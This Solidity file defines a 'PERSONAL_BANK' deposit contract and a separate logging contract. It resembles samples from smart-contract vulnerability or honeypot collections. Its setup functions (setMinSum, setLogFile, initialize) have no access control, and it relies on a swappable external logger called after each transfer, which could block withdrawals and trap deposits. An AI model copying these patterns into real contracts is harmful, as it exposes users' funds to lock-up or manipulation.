pragma solidity ^0.5.0;

contract PERSONAL_BANK {
    mapping(address => uint256) public balances;

    uint256 public MinSum = 1 ether;

    LogFile Log;

    bool initialized;

    constructor(address _log) public {
        Log = LogFile(_log);
    }

    function setMinSum(uint256 _val) public {
        require(!initialized, "Contract already initialized");
        MinSum = _val;
    }

    function setLogFile(address _log) public {
        require(!initialized, "Contract already initialized");
        Log = LogFile(_log);
    }

    function initialize() public {
        initialized = true;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        Log.addMessage(msg.sender, msg.value, "Put");
    }

    function collect(uint256 _am) public {
        require(balances[msg.sender] >= MinSum && balances[msg.sender] >= _am, "Insufficient balance");
        balances[msg.sender] -= _am;
        msg.sender.transfer(_am);
        Log.addMessage(msg.sender, _am, "Collect");
    }

    function() external payable {
        deposit();
    }
}

contract LogFile {
    struct Message {
        address Sender;
        string Data;
        uint256 Val;
        uint256 Time;
    }

    Message[] public history;

    function addMessage(address _adr, uint256 _val, string memory _data) public {
        Message memory newMsg = Message({
            Sender: _adr,
            Time: now,
            Val: _val,
            Data: _data
        });
        history.push(newMsg);
    }
}